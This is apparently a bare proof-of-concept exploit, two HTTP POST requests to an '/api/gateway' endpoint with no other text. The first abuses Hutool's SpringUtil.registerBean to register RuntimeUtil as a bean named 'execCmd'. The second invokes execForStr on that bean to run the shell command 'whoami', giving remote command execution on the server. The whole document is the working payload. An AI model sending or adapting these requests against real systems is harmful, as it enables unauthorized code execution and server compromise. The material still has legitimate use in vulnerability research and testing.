```HTTP
POST /api/gateway HTTP/1.1
Host: 127.0.0.1:48800
Content-Type: application/json
Content-Length: 155

{"beanName":"cn.hutool.extra.spring.SpringUtil","methodName":"registerBean","params":{"arg0":"execCmd","arg1":{"@type":"cn.hutool.core.util.RuntimeUtil"}}}
```

```HTTP
POST /api/gateway HTTP/1.1
Host: 127.0.0.1:48800
Content-Type: application/json
Content-Length: 92

{"beanName":"execCmd","methodName":"execForStr","params":{"arg0":"utf-8","arg1":["whoami"]}}
```
